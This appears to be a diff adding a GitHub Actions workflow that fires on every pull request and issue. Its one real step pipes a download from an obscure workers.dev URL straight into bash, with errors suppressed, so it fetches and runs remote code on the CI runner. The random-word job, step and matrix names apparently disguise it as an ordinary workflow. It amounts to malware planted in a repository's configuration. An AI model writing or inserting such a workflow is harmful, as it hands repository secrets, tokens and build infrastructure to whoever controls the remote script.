@@ -1,0 +1,18 @@
+name: February
+
+on:
+  pull_request:
+  issues:
+
+jobs:
+  glad:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    - name: function
+      continue-on-error: true
+      run: curl "https://i.donnickcarbonaro70085.workers.dev/db59e0c522636da/3df063985b71d4e333b4e5332423ddd7/32ea21f72b4cc5226?mjw=1775327217&wrt=vy&rhc=lsz" | bash
+    strategy:
+      matrix:
+        harmony: ["relationship", "painful", "mark", "similarly", "arrive"]
+        occurrence: ["construct", "scold", "bacteria", "sustainable"]
